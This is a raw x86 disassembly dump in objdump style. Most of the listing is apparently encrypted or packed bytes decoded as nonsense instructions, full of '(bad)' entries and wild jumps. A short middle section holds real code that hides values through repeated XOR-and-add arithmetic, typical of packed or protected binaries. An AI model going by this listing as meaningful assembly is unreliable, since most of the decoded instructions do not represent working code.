  41ad30:	(bad)  
  41ad32:	(bad)  
  41ad34:	icebp  
  41ad35:	fcmovbe st,st(7)
  41ad37:	in     eax,0xeb
  41ad39:	add    DWORD PTR ds:0xc704e009,ecx
  41ad3f:	jmp    0x41acf1
  41ad41:	ret    
  41ad42:	rol    dl,cl
  41ad44:	retf   
  41ad45:	in     eax,0xeb
  41ad47:	jmp    0xc90e8804
  41ad4c:	aam    0xb8
  41ad4e:	icebp  
  41ad4f:	loope  0x41ad0a
  41ad51:	std    
  41ad52:	mov    esp,0xd5c20001
  41ad57:	imul   ebx
  41ad59:	leave  
  41ad5a:	fsubp  st(7),st
  41ad5c:	retf   
  41ad5d:	enter  0xd7f2,0xaf
  41ad61:	mov    bl,0xf3
  41ad63:	hlt    
  41ad64:	mov    dh,0xda
  41ad66:	mov    ah,0xb9
  41ad68:	mov    ebx,0xb803d1d1
  41ad6d:	repz rol DWORD PTR [ebx],1
  41ad70:	fcmovb st,st(3)
  41ad72:	repz fld QWORD PTR [ebx]
  41ad75:	vcmpss xmm6,xmm3,xmm7,0xc7
  41ad7a:	in     eax,0xc
  41ad7c:	stc    
  41ad7d:	repz in eax,0xe8
  41ad80:	(bad)  
  41ad82:	lods   al,BYTE PTR ds:[esi]
  41ad83:	enter  0xf1db,0xcf
  41ad87:	call   0xb7206c52
  41ad8c:	stc    
  41ad8d:	mov    al,0xf9
  41ad8f:	(bad)  
  41ad90:	in     eax,dx
  41ad91:	loopne 0x41ad72
  41ad93:	fstp   TBYTE PTR [esi+ebx*8+0x8fdd8c2]
  41ad9a:	cld    
  41ad9b:	add    BYTE PTR [edx+edi*8],cl
  41ad9e:	out    dx,al
  41ad9f:	idiv   DWORD PTR [ebp-0xc1f2943]
  41ada5:	lock shr eax,1
  41ada8:	(bad)  
  41ada9:	mov    edx,0xd6c8ccfc
  41adae:	clc    
  41adaf:	fneni(8087 only) 
  41adb1:	neg    dh
  41adb3:	shl    ecx,cl
  41adb5:	jmp    0xc51aa59d
  41adba:	mov    BYTE PTR ds:0xe5e8ca05,0xcb
  41adc1:	loope  0x41adb9
  41adc3:	mov    ah,0xb5
  41adc5:	out    0xb0,al
  41adc7:	cmc    
  41adc8:	fnstenv [eax-0x350ffc0a]
  41adce:	(bad)  
  41add0:	push   es
  41add1:	sti    
  41add2:	icebp  
  41add3:	(bad)  
  41add4:	(bad)  
  41add5:	add    eax,0xde6d907
  41adda:	cld    
  41addb:	hlt    
  41addc:	in     al,0xec
  41adde:	mov    bl,0xe0
  41ade0:	mov    edi,0xd2c1b3af
  41ade5:	ror    eax,cl
  41ade7:	ror    edx,cl
  41ade9:	mov    edi,0xd8d6eec4
  41adee:	in     al,dx
  41adef:	cmc    
  41adf0:	cli    
  41adf1:	push   es
  41adf2:	std    
  41adf3:	test   esp,0xc9d708c4
  41adf9:	retf   
  41adfa:	hlt    
  41adfb:	add    DWORD PTR [edx],ecx
  41adfd:	fmul   st(6),st
  41adff:	retf   0xebec
  41ae02:	jmp    0xb80389b1
  41ae07:	(bad)  
  41ae08:	xlat   BYTE PTR ds:[ebx]
  41ae09:	icebp  
  41ae0a:	repnz (bad) 
  41ae0c:	out    dx,al
  41ae0d:	cli    
  41ae0e:	out    dx,eax
  41ae0f:	loop   0x41ade1
  41ae11:	add    esi,esi
  41ae13:	(bad)  
  41ae15:	ret    0xdbd4
  41ae18:	jmp    0xa24b800
  41ae1d:	adc    eax,eax
  41ae1f:	icebp  
  41ae20:	repz fmul st(7),st
  41ae23:	mov    ah,0xcd
  41ae25:	out    0xf2,al
  41ae27:	lock out 0xb6,eax
  41ae2a:	(bad)  
  41ae2c:	(bad)  
  41ae2d:	int3   
  41ae2e:	out    dx,eax
  41ae2f:	ret    
  41ae30:	rol    DWORD PTR ds:0xfbd0e5f4,0xe7
  41ae37:	std    
  41ae38:	aad    0xca
  41ae3a:	retf   0xdeec
  41ae3d:	jmp    0x41ae28
  41ae3f:	stos   BYTE PTR es:[edi],al
  41ae40:	out    dx,al
  41ae41:	out    0xe5,eax
  41ae43:	mov    al,0xce
  41ae45:	hlt    
  41ae46:	jmp    0xd6ca:0xe9c9e4c7
  41ae4d:	fninit 
  41ae4f:	add    ebx,edi
  41ae51:	out    dx,al
  41ae52:	in     al,dx
  41ae53:	loope  0x41ae30
  41ae55:	icebp  
  41ae56:	fcomip st,st(0)
  41ae58:	sti    
  41ae59:	or     cl,BYTE PTR [edi]
  41ae5b:	loope  0x41ae4b
  41ae5d:	cld    
  41ae5e:	ror    dh,cl
  41ae60:	out    0xd3,eax
  41ae62:	call   0xc1f35b56
  41ae67:	icebp  
  41ae68:	hlt    
  41ae69:	icebp  
  41ae6a:	cmc    
  41ae6b:	div    dl
  41ae6d:	leave  
  41ae6e:	rcr    edx,1
  41ae70:	int    0xfb
  41ae72:	int3   
  41ae73:	rcl    edi,1
  41ae75:	aam    0xf1
  41ae77:	add    bh,ah
  41ae79:	fsubr  st,st(1)
  41ae7b:	or     al,0xfc
  41ae7d:	into   
  41ae7e:	(bad)  
  41ae7f:	scas   al,BYTE PTR es:[edi]
  41ae80:	loope  0x41ae44
  41ae82:	in     eax,dx
  41ae83:	(bad)  
  41ae84:	jmp    0xe4c6:0xfab0b4b4
  41ae8b:	clc    
  41ae8c:	into   
  41ae8d:	sti    
  41ae8e:	enter  0xf7ce,0xd0
  41ae92:	loop   0x41ae6a
  41ae94:	fcmovnb st,st(3)
  41ae96:	(bad)  
  41ae97:	hlt    
  41ae98:	fsubr  st,st(3)
  41ae9a:	add    ecx,ecx
  41ae9c:	in     eax,0x0
  41ae9e:	mov    ebp,0xe7a8e5e0
  41aea3:	in     eax,0xc3
  41aea5:	aam    0xd7
  41aea7:	mov    cl,0xb6
  41aea9:	neg    ecx
  41aeab:	mov    edi,0xe0d2d1b4
  41aeb0:	rol    eax,1
  41aeb2:	idiv   bh
  41aeb4:	out    0x5,al
  41aeb6:	loope  0x41aeb1
  41aeb8:	jmp    0x41aea5
  41aeba:	add    eax,0xc90f13e8
  41aebf:	ror    al,1
  41aec1:	fmulp  st(6),st
  41aec3:	call   0xef2e9891
  41aec8:	jmp    0x41aea8
  41aeca:	cld    
  41aecb:	shl    bl,1
  41aecd:	add    ecx,edx
  41aecf:	in     al,dx
  41aed0:	out    0xd3,al
  41aed2:	loopne 0x41ae95
  41aed4:	fld    st(5)
  41aed6:	add    al,BYTE PTR ds:0xf4e701f5
  41aedc:	fldln2 
  41aede:	in     al,0xc7
  41aee0:	scas   eax,DWORD PTR es:[edi]
  41aee1:	jmp    0x41aec7
  41aee3:	aam    0xac
  41aee5:	cli    
  41aee6:	fxch   st(6)
  41aee8:	fcmovu st,st(6)
  41aeea:	mov    ah,0xd1
  41aeec:	(bad)  
  41aeee:	fcmovnb st,st(2)
  41aef0:	mov    ecx,0x2f2c600
  41aef5:	fmul   st,st(2)
  41aef7:	stc    
  41aef8:	push   es
  41aef9:	clc    
  41aefa:	loopne 0x41aebe
  41aefc:	fmulp  st(1),st
  41aefe:	jmp    0x41aeb0
  41af00:	loope  0x41aecf
  41af02:	loopne 0x41aee7
  41af04:	loope  0x41aecf
  41af06:	stc    
  41af07:	mov    ah,0xda
  41af09:	(bad)  
  41af0b:	fsubr  st(2),st
  41af0d:	cmc    
  41af0e:	loope  0x41aee2
  41af10:	(bad)  
  41af12:	add    ebp,eax
  41af14:	fcomi  st,st(1)
  41af16:	in     al,0xe4
  41af18:	jmp    0x41af20
  41af1a:	add    ah,ah
  41af1c:	repz (bad) 
  41af1f:	call   0xb4229813
  41af24:	repz (bad) 
  41af26:	retf   
  41af27:	loopne 0x41af1b
  41af29:	call   0xd3188025
  41af2e:	sti    
  41af2f:	repz clc 
  41af31:	add    eax,0xc2c0e3dd
  41af36:	jmp    0xd900:0xe6f606d7
  41af3d:	jmp    0x41af0d
  41af3f:	mov    bl,0xe5
  41af41:	in     al,0xb7
  41af43:	mov    ch,0xb0
  41af45:	loop   0x41af1e
  41af47:	(bad)  
  41af48:	cmc    
  41af49:	cli    
  41af4a:	rcl    cl,cl
  41af4c:	(bad)  
  41af4d:	repnz mov bh,0xee
  41af50:	out    dx,eax
  41af51:	mov    ebp,0xf4c7e6e2
  41af56:	rol    ah,1
  41af58:	add    edi,eax
  41af5a:	push   cs
  41af5b:	or     BYTE PTR [edi*8-0x1b122714],cl
  41af62:	iret   
  41af63:	mov    dl,0xc8
  41af65:	ret    0xb0c8
  41af68:	out    dx,eax
  41af69:	(bad)  
  41af6a:	cli    
  41af6b:	icebp  
  41af6c:	int3   
  41af6d:	fdivr  QWORD PTR [ecx-0x272e4002]
  41af73:	ret    0x2c5
  41af76:	add    eax,DWORD PTR [ecx+eax*1]
  41af79:	enter  0xffeb,0xdc
  41af7d:	adc    ecx,ebp
  41af7f:	shr    ecx,0xce
  41af82:	loope  0x41af65
  41af84:	mov    al,0xe2
  41af86:	repnz in al,dx
  41af88:	in     al,dx
  41af89:	vpminsw ymm7,ymm2,ymm6
  41af8d:	int    0xb8
  41af8f:	out    dx,eax
  41af90:	mov    esp,0xf9f5f7c7
  41af95:	hlt    
  41af96:	ret    0xdfe2
  41af99:	in     eax,0xe7
  41af9b:	add    al,BYTE PTR ds:0xc8e7b3d9
  41afa1:	bnd call 0xd5397070
  41afa7:	icebp  
  41afa8:	mov    dh,0xf2
  41afaa:	mov    edx,0xeeb8b1b2
  41afaf:	out    dx,al
  41afb0:	rol    BYTE PTR [esi],0xbc
  41afb3:	ret    0xfd07
  41afb6:	ret    0x807
  41afb9:	loopne 0x41afc2
  41afbb:	fild   DWORD PTR [ecx]
  41afbd:	adc    esi,edx
  41afbf:	int    0xe4
  41afc1:	iret   
  41afc2:	loope  0x41af71
  41afc4:	repz mov dl,0xf0
  41afc7:	(bad)  
  41afc9:	add    eax,0x3272fb
  41afce:	mov    ecx,DWORD PTR [ebp-0x13c]
  41afd4:	sub    ecx,eax
  41afd6:	mov    DWORD PTR [ebp-0x10c],ecx
  41afdc:	mov    DWORD PTR [ebp-0x114],0xf89c85bf
  41afe6:	cmp    DWORD PTR [ebp-0x104],0xf89c85b0
  41aff0:	je     0x421d21
  41aff6:	mov    eax,DWORD PTR [ebp-0x11c]
  41affc:	xor    eax,0x75108b5
  41b001:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b007:	xor    ecx,0x75108b5
  41b00d:	lea    ecx,[eax+ecx*1+0x64e5f6]
  41b014:	mov    eax,DWORD PTR [ebp-0x10c]
  41b01a:	xor    edx,edx
  41b01c:	div    ecx
  41b01e:	mov    eax,DWORD PTR [ebp-0x104]
  41b024:	xor    eax,0x75108b5
  41b029:	add    eax,0x3272fb
  41b02e:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b034:	xor    ecx,0x75108b5
  41b03a:	jmp    0x41d3e0
  41b03f:	cli    
  41b040:	adc    BYTE PTR [ebx+0x2c24b1fd],ch
  41b046:	adc    al,0x9e
  41b048:	pmulhuw mm0,QWORD PTR [esi]
  41b04b:	popf   
  41b04c:	(bad)  [eax+0x7adac07c]
  41b052:	jnp    0x41b056
  41b054:	cwde   
  41b055:	jnp    0x41b0d2
  41b057:	call   0xe2407d28
  41b05c:	add    DWORD PTR [eax],eax
  41b05e:	out    0xe2,al
  41b060:	out    0xd7,eax
  41b062:	ror    ebx,cl
  41b064:	cmc    
  41b065:	aam    0xe1
  41b067:	jecxz  0x41b069
  41b069:	loopne 0x41b051
  41b06b:	add    al,0xad
  41b06d:	mov    esi,0xbcf2b6c7
  41b072:	rcl    ebx,cl
  41b074:	out    dx,al
  41b075:	stc    
  41b076:	in     al,0xd6
  41b078:	retf   0xf0f5
  41b07b:	inc    ebx
  41b07d:	iret   
  41b07e:	add    esp,ebp
  41b080:	loope  0x41b03e
  41b082:	lock out 0xc4,al
  41b085:	or     dl,ch
  41b087:	stc    
  41b088:	loope  0x41b079
  41b08a:	(bad)  
  41b08b:	icebp  
  41b08c:	scas   al,BYTE PTR es:[edi]
  41b08d:	into   
  41b08e:	shr    BYTE PTR [ebp-0x4a312a11],cl
  41b094:	test   al,0xeb
  41b097:	lods   al,BYTE PTR ds:[esi]
  41b098:	clc    
  41b099:	fsubr  st(2),st
  41b09b:	loope  0x41b074
  41b09d:	clc    
  41b09e:	clc    
  41b09f:	fadd   st(1),st
  41b0a1:	ffreep st(2)
  41b0a3:	in     eax,0xf5
  41b0a5:	hlt    
  41b0a6:	out    dx,al
  41b0a7:	add    ah,dl
  41b0a9:	jecxz  0x41b0af
  41b0ab:	(bad)  
  41b0ac:	(bad)  
  41b0ae:	imul   DWORD PTR [edi-0x4b113e35]
  41b0b4:	ror    edx,1
  41b0b6:	call   0xbd356fa9
  41b0bb:	jmp    0xf4e3:0xdde2c2ce
  41b0c2:	lock stc 
  41b0c4:	(bad)  
  41b0c5:	clc    
  41b0c6:	ffree  st(4)
  41b0c8:	add    ebx,ebp
  41b0ca:	stc    
  41b0cb:	shl    BYTE PTR [edx-0x19153a13],cl
  41b0d1:	icebp  
  41b0d2:	iret   
  41b0d3:	(bad)
  41b0d6:	iret   
  41b0d7:	div    ch
  41b0d9:	jecxz  0x41b09a
  41b0db:	aad    0xb7
  41b0dd:	add    ebp,esi
  41b0df:	xlat   BYTE PTR ds:[ebx]
  41b0e0:	repz ffree st(2)
  41b0e3:	retf   
  41b0e4:	add    al,cl
  41b0e6:	fisttp DWORD PTR [esi]
  41b0e8:	push   cs
  41b0e9:	(bad)  
  41b0ea:	or     cl,cl
  41b0ec:	(bad)  
  41b0ed:	lods   eax,DWORD PTR ds:[esi]
  41b0ee:	loopne 0x41b0d9
  41b0f0:	jmp    0x41b0d4
  41b0f2:	in     al,0xd2
  41b0f4:	cmc    
  41b0f5:	sti    
  41b0f6:	(bad)  
  41b0f9:	mov    ebx,0xd8e9c3d5
  41b0fe:	add    ebx,edx
  41b100:	mov    esi,0xfbe0eacc
  41b105:	or     eax,esi
  41b107:	(bad)  
  41b109:	fadd   DWORD PTR [eax]
  41b10b:	in     eax,0xca
  41b10d:	scas   eax,DWORD PTR es:[edi]
  41b10e:	leave  
  41b10f:	cmc    
  41b110:	call   0xbbf896da
  41b115:	jmp    0xb2f887ce
  41b11a:	fdivr  st(5),st
  41b11c:	loope  0x41b10e
  41b11e:	mov    esi,0xdedce1fd
  41b123:	cld    
  41b124:	hlt    
  41b125:	(bad)  
  41b127:	out    dx,eax
  41b128:	fimul  WORD PTR [edi]
  41b12a:	pop    es
  41b12b:	retf   
  41b12c:	(bad)  
  41b12d:	repz mov al,0xca
  41b130:	shl    DWORD PTR [ecx-0x302c2530],1
  41b136:	mov    edx,0xdfc8c4cb
  41b13b:	leave  
  41b13c:	lock int 0xee
  41b13f:	repnz mov edi,0x101e0ff
  41b145:	aam    0xeb
  41b147:	iret   
  41b148:	dec    DWORD PTR [edi]
  41b14a:	fsubr  st,st(2)
  41b14c:	lods   eax,DWORD PTR ds:[esi]
  41b14d:	test   eax,0xc5e4d2f6
  41b152:	ret    
  41b153:	jmp    0xfdcb:0xded8f4f7
  41b15a:	lock (bad) 
  41b15c:	jmp    0xf21daf1d
  41b161:	cmc    
  41b162:	hlt    
  41b163:	rcl    ebp,1
  41b165:	push   esi
  41b167:	aam    0xe6
  41b169:	fsubr  st(6),st
  41b16b:	fcmovb st,st(4)
  41b16d:	retf   0xf2e9
  41b170:	mov    ebp,0xe0ced4f1
  41b175:	out    0xf6,al
  41b177:	out    dx,al
  41b178:	mov    bl,0xf1
  41b17a:	mov    ebp,0xe1bcd8ff
  41b17f:	int    0xbc
  41b181:	add    esi,esp
  41b183:	out    0xb,eax
  41b185:	rol    BYTE PTR ds:0xfde6c9ce,0xf9
  41b18c:	jmp    0xb104997d
  41b191:	in     al,dx
  41b192:	in     eax,dx
  41b193:	lods   al,BYTE PTR ds:[esi]
  41b194:	jmp    0x41b15d
  41b196:	int3   
  41b197:	mov    edx,0xd4dff6b7
  41b19c:	cmc    
  41b19d:	add    bh,bl
  41b19f:	std    
  41b1a0:	(bad)  
  41b1a1:	cli    
  41b1a2:	repnz push esp
  41b1a5:	aad    0xfc
  41b1a7:	clc    
  41b1a8:	clc    
  41b1a9:	out    0xe7,al
  41b1ab:	push   cs
  41b1ac:	jmp    0xd30897a3
  41b1b1:	jmp    0xdef6:0xcccad4e0
  41b1b8:	aam    0xf9
  41b1ba:	iret   
  41b1bb:	cld    
  41b1bc:	xlat   BYTE PTR ds:[ebx]
  41b1bd:	(bad)  
  41b1bf:	pop    es
  41b1c0:	(bad)  
  41b1c1:	cli    
  41b1c2:	add    bh,ah
  41b1c4:	dec    BYTE PTR [ecx]
  41b1c6:	mov    ebp,0xf8fbfaef
  41b1cb:	or     edi,ecx
  41b1cd:	fadd   st(2),st
  41b1cf:	ret    0xc4ca
  41b1d2:	ret    
  41b1d3:	mov    dl,0xe1
  41b1d5:	jmp    0x41b1c8
  41b1d7:	cli    
  41b1d8:	rcr    esi,cl
  41b1da:	mov    ah,0xb4
  41b1dc:	add    eax,edi
  41b1de:	fbstp  TBYTE PTR [edx+eiz*8-0x1e042839]
  41b1e5:	(bad)  
  41b1e6:	iret   
  41b1e7:	loop   0x41b1ed
  41b1e9:	out    0x0,al
  41b1eb:	clc    
  41b1ec:	leave  
  41b1ed:	shl    eax,1
  41b1ef:	mov    dl,0xf3
  41b1f1:	jmp    0x41b1db
  41b1f3:	retf   0xf3b7
  41b1f6:	out    0xc9,al
  41b1f8:	repz retf 
  41b1fa:	aam    0x3
  41b1fc:	add    esp,ecx
  41b1fe:	mov    esp,0xffdcd3d6
  41b203:	(bad)  
  41b204:	ror    DWORD PTR [eax],1
  41b206:	aam    0xdc
  41b208:	or     bl,ah
  41b20a:	fcmovu st,st(2)
  41b20c:	test   al,0xb3
  41b20e:	shr    BYTE PTR [eax+eax*8-0x3e2c562c],0xf4
  41b216:	retf   
  41b217:	int    0xef
  41b219:	int    0xb4
  41b21b:	int    0xba
  41b21d:	shl    al,cl
  41b21f:	add    DWORD PTR [esi-0x2f211a21],edi
  41b225:	add    bl,bl
  41b227:	pop    es
  41b228:	(bad)  
  41b229:	fadd   QWORD PTR [edi]
  41b22b:	loopne 0x41b1ea
  41b22d:	in     al,dx
  41b22e:	mov    ebp,0xdbf1b7dc
  41b233:	(bad)  
  41b234:	loope  0x41b205
  41b236:	div    BYTE PTR [ebp-0x8130432]
  41b23c:	loopne 0x41b20d
  41b23e:	hlt    
  41b23f:	int    0xfc
  41b241:	add    dh,dh
  41b243:	(bad)  
  41b245:	loopne 0x41b211
  41b247:	leave  
  41b248:	or     bl,cl
  41b24a:	cli    
  41b24b:	ror    ch,cl
  41b24d:	out    dx,al
  41b24e:	out    dx,al
  41b24f:	(bad)  
  41b250:	out    dx,eax
  41b251:	in     eax,dx
  41b252:	lock stc 
  41b254:	mov    bh,0xc7
  41b256:	call   0xcef79849
  41b25b:	fld    QWORD PTR [eax]
  41b25d:	(bad)  
  41b25f:	mov    ah,0xbb
  41b261:	mov    esi,0xc0dbd8f7
  41b266:	cld    
  41b267:	retf   0xd9c4
  41b26a:	add    al,0xe5
  41b26c:	fsubr  DWORD PTR [ebp-0x3b14372d]
  41b272:	icebp  
  41b273:	(bad)  
  41b274:	loope  0x41b268
  41b276:	in     al,dx
  41b277:	fmulp  st(3),st
  41b279:	icebp  
  41b27a:	test   al,0xde
  41b27d:	shl    eax,0xd3
  41b280:	ror    DWORD PTR [ebx],0xf9
  41b283:	lock rcl eax,0xf4
  41b287:	fadd   st,st(5)
  41b289:	clc    
  41b28a:	loope  0x41b25a
  41b28c:	mov    bh,0xd3
  41b28f:	mov    dh,0xac
  41b291:	div    ebx
  41b293:	repz (bad) 
  41b295:	repnz repnz in al,dx
  41b298:	jmp    0xca3c8f6d
  41b29d:	test   esp,0x1fcf9f5
  41b2a3:	push   es
  41b2a4:	ror    al,0xfb
  41b2a7:	(bad)  
  41b2a8:	loopne 0x41b294
  41b2aa:	(bad)  
  41b2ab:	(bad)  
  41b2ac:	shr    al,cl
  41b2ae:	fsubr  st(6),st
  41b2b0:	in     al,0xcf
  41b2b2:	loope  0x41b26f
  41b2b4:	(bad)  
  41b2b5:	hlt    
  41b2b6:	enter  0xf4ff,0xcb
  41b2ba:	add    dh,bl
  41b2bc:	loope  0x41b299
  41b2be:	(bad)  
  41b2c0:	fdivp  st(3),st
  41b2c2:	out    0xc3,al
  41b2c4:	leave  
  41b2c5:	cmc    
  41b2c6:	jmp    0x73bb68f
  41b2cb:	retf   
  41b2cc:	out    dx,al
  41b2cd:	out    0xcd,eax
  41b2cf:	(bad)  
  41b2d0:	in     eax,0xdc
  41b2d2:	rol    dl,0xd9
  41b2d5:	mov    dh,0xd3
  41b2d7:	mov    ebx,0xdaf0ecd2
  41b2dc:	iret   
  41b2dd:	call   0xf53f75b5
  41b2e2:	xlat   BYTE PTR ds:[ebx]
  41b2e3:	ret    0xd0e9
  41b2e6:	out    dx,al
  41b2e7:	add    ch,bl
  41b2e9:	fucomi st,st(1)
  41b2eb:	shr    esp,cl
  41b2ed:	fsubrp st(0),st
  41b2ef:	mov    bh,0xe0
  41b2f1:	fsubr  st(0),st
  41b2f3:	mov    edx,0xd8cdb0e4
  41b2f8:	(bad)
  41b2fb:	out    dx,al
  41b2fc:	add    DWORD PTR [edi],eax
  41b2fe:	int    0xe5
  41b300:	mov    esi,0xd9c3e5c2
  41b305:	hlt    
  41b306:	enter  0x5da,0xc9
  41b30a:	stc    
  41b30b:	or     al,0xac
  41b30d:	out    dx,al
  41b30e:	loopne 0x41b2dd
  41b310:	scas   al,BYTE PTR es:[edi]
  41b311:	mov    dl,0xc0
  41b313:	int3   
  41b314:	out    0xb2,eax
  41b316:	(bad)  
  41b317:	call   edi
  41b319:	icebp  
  41b31a:	ret    
  41b31b:	clc    
  41b31c:	repnz fdivr st(2),st
  41b31f:	add    dl,ah
  41b321:	lock out 0xdb,eax
  41b324:	test   DWORD PTR [ebx],0xc3e6fb
  41b32a:	jmp    0xe1e7:0xe5aceeee
  41b331:	into   
  41b332:	out    0xb3,eax
  41b334:	icebp  
  41b335:	retf   0xe8fa
  41b338:	mov    edi,0xdecabdcb
  41b33d:	cld    
  41b33e:	push   es
  41b33f:	shl    bh,0xe3
  41b342:	(bad)  
  41b343:	(bad)  
  41b344:	aad    0xfd
  41b346:	(bad)  
  41b348:	loop   0x41b32d
  41b34a:	or     ebp,eax
  41b34c:	mov    esi,0xc5bdc0cf
  41b351:	into   
  41b352:	mov    cl,0xb6
  41b354:	iret   
  41b355:	mov    eax,0xd8f6cdf4
  41b35a:	ret    
  41b35b:	fdivr  DWORD PTR [edx-0x20022d4a]
  41b361:	lock (bad) 
  41b364:	in     eax,0xda
  41b366:	out    0xe8,eax
  41b368:	(bad)  
  41b36a:	cli    
  41b36b:	(bad)  
  41b36d:	enter  0xf5c3,0xd4
  41b371:	cmc    
  41b372:	lock jmp 0xc5267d73
  41b378:	icebp  
  41b379:	jmp    0xd742b57a
  41b37e:	out    0xfb,al
  41b380:	add    ebx,ebp
  41b382:	add    dh,ch
  41b384:	rol    DWORD PTR [edi],1
  41b386:	bswap  esi
  41b388:	or     DWORD PTR [ecx],eax
  41b38a:	int    0xc4
  41b38c:	loop   0x41b33b
  41b38e:	out    0xd7,al
  41b390:	mov    dl,0xee
  41b392:	ret    
  41b393:	xabort 0xd9
  41b396:	into   
  41b397:	aam    0xe9
  41b399:	fistp  QWORD PTR [eax-0x460a4124]
  41b39f:	idiv   BYTE PTR [esi-0x1021419]
  41b3a5:	enter  0xcef4,0xfb
  41b3a9:	(bad)  
  41b3ab:	repz mov edi,0xc5bcddf3
  41b3b1:	fcomi  st,st(4)
  41b3b3:	int3   
  41b3b4:	(bad)  
  41b3b5:	leave  
  41b3b6:	mov    ebp,0xf0c9b6f0
  41b3bc:	ret    
  41b3bd:	fnop   
  41b3bf:	fidivr WORD PTR [ebp+0x1b807da]
  41b3c5:	fcomp  st(1)
  41b3c7:	add    al,0x1
  41b3c9:	retf   0xf2ef
  41b3cc:	shr    al,cl
  41b3ce:	(bad)
  41b3d2:	(bad)
  41b3d5:	(bad)
  41b3d9:	retf   
  41b3da:	hlt    
  41b3db:	(bad)  
  41b3dd:	sar    BYTE PTR [esi-0x29251822],0x1
  41b3e4:	(bad)  
  41b3e6:	clc    
  41b3e7:	push   cs
  41b3e8:	(bad)  
  41b3e9:	fsubrp st(4),st
  41b3eb:	or     eax,0xf6efacdd
  41b3f0:	mov    bh,0xed
  41b3f2:	ret    0xf8fa
  41b3f5:	les    esi,FWORD PTR [esi-0x9281a2a]
  41b3fb:	jmp    0xdaec:0xcfe1e9
  41b402:	jmp    0x41b3e2
  41b404:	or     edx,esp
  41b406:	add    eax,0xcde1020d
  41b40b:	out    dx,al
  41b40c:	in     eax,0xd0
  41b40e:	mov    esi,0xb3b2c4e3
  41b413:	(bad)  
  41b415:	out    0xe5,al
  41b417:	lock mov dh,0xb2
  41b41a:	in     eax,dx
  41b41b:	leave  
  41b41c:	mov    esp,0xe1e6defa
  41b421:	loope  0x41b3e9
  41b423:	rol    ah,1
  41b425:	loop   0x41b42b
  41b427:	leave  
  41b428:	(bad)  
  41b429:	repz lds eax,FWORD PTR [edx]
  41b42c:	mov    eax,0xe7a8a8ca
  41b431:	stos   BYTE PTR es:[edi],al
  41b432:	int3   
  41b433:	(bad)  
  41b434:	repz call 0xdd1ca031
  41b43a:	jmp    0x41b404
  41b43c:	xlat   BYTE PTR ds:[ebx]
  41b43d:	mov    ebp,0xc1f6dbd1
  41b442:	add    edi,esi
  41b444:	or     ah,ah
  41b446:	pop    es
  41b447:	in     eax,dx
  41b448:	paddw  mm7,mm2
  41b44b:	in     eax,0xc5
  41b44d:	lods   eax,DWORD PTR ds:[esi]
  41b44e:	out    0xb0,al
  41b450:	shl    ch,1
  41b452:	fcmovne st,st(7)
  41b454:	jmp    0xf6fda93f
  41b459:	(bad)  
  41b45a:	rcr    ecx,1
  41b45c:	(bad)  
  41b45e:	repz aam 0x7
  41b461:	add    dl,al
  41b463:	hlt    
  41b464:	sar    BYTE PTR [esi-0x1c3af636],1
  41b46a:	add    al,0x6
  41b46c:	out    0xcb,al
  41b46e:	loope  0x41b45c
  41b470:	ror    ecx,cl
  41b472:	ret    
  41b473:	in     eax,0xd8
  41b475:	retf   0xd6ea
  41b478:	out    dx,al
  41b479:	mov    ebx,0xffeed7fc
  41b47e:	inc    eax
  41b480:	cmc    
  41b481:	sar    al,0x3
  41b484:	add    eax,0xc600e9f4
  41b489:	int    0xe4
  41b48b:	jmp    0x41b446
  41b48d:	ffreep st(3)
  41b48f:	mov    esp,0xcfe1cdac
  41b494:	lds    esi,FWORD PTR [ecx+edi*4-0x12073654]
  41b49b:	(bad)  
  41b49c:	mov    edx,0xd0d8c2fe
  41b4a1:	(bad)  
  41b4a2:	mov    esp,0xd7f905e9
  41b4a7:	(bad)  
  41b4a8:	enter  0x3ef,0xca
  41b4ac:	(bad)  
  41b4ae:	loope  0x41b490
  41b4b0:	repz aad 0xf5
  41b4b3:	fcmovbe st,st(2)
  41b4b5:	iret   
  41b4b6:	(bad)  
  41b4b7:	mov    al,0xe5
  41b4b9:	cmc    
  41b4ba:	mov    cl,0xb4
  41b4bc:	std    
  41b4bd:	rcl    eax,cl
  41b4bf:	shr    esp,1
  41b4c1:	or     ebp,edx
  41b4c3:	(bad)  
  41b4c4:	jmp    0xec04:0xd40b02c8
  41b4cb:	ffreep st(2)
  41b4cd:	ret    0xb6de
  41b4d0:	shr    BYTE PTR [ebp-0x37160f18],1
  41b4d6:	in     al,dx
  41b4d7:	lds    edi,FWORD PTR [ebp-0x2a010e0e]
  41b4dd:	mov    ecx,0xd5fbd7d4
  41b4e2:	cld    
  41b4e3:	out    0xd7,al
  41b4e5:	fsub   st(0),st
  41b4e7:	(bad)  
  41b4e8:	loope  0x41b4e6
  41b4ea:	repnz shr DWORD PTR [esi-0x1e1a4e24],cl
  41b4f1:	int3   
  41b4f2:	leave  
  41b4f3:	in     eax,0xd4
  41b4f5:	loopne 0x41b4a7
  41b4f7:	lock cld 
  41b4f9:	(bad)  
  41b4fa:	mov    edx,0xddf3ffd4
  41b4ff:	test   BYTE PTR [edi],0x1
  41b502:	inc    DWORD PTR [eax]
  41b504:	fxch   st(2)
  41b506:	iret   
  41b507:	(bad)  
  41b509:	or     al,0x13
  41b50b:	add    ch,al
  41b50d:	shl    DWORD PTR [edi-0x9390f34],cl
  41b513:	stc    
  41b514:	int3   
  41b515:	int    0xc9
  41b517:	leave  
  41b518:	std    
  41b519:	jmp    0xd8229310
  41b51e:	jecxz  0x41b511
  41b520:	loope  0x41b504
  41b522:	fstp   st(1)
  41b524:	mov    edi,0xe8050ec9
  41b529:	call   0xec048112
  41b52e:	out    0xc6,eax
  41b530:	out    dx,eax
  41b531:	jmp    0xfaf78a00
  41b536:	clc    
  41b537:	jmp    0x41b523
  41b539:	rcr    bl,cl
  41b53b:	(bad)  
  41b53d:	out    0xcc,eax
  41b53f:	idiv   DWORD PTR [esi-0x1e340f2f]
  41b545:	lock or DWORD PTR [edx+ebp*8],eax
  41b549:	loopne 0x41b552
  41b54b:	fild   QWORD PTR [eax-0x3d352f2d]
  41b551:	rol    edi,1
  41b553:	jmp    0xfdb4:0xc4add5e0
  41b55a:	jecxz  0x41b538
  41b55c:	fnstsw WORD PTR [ebp-0x202ef947]
  41b562:	or     edx,ecx
  41b564:	loop   0x41b550
  41b566:	(bad)  
  41b567:	fadd   QWORD PTR ds:0xac02f800
  41b56d:	stos   BYTE PTR es:[edi],al
  41b56e:	scas   al,BYTE PTR es:[edi]
  41b56f:	fsubr  st(4),st
  41b571:	cmc    
  41b572:	hlt    
  41b573:	(bad)  
  41b574:	rol    esp,cl
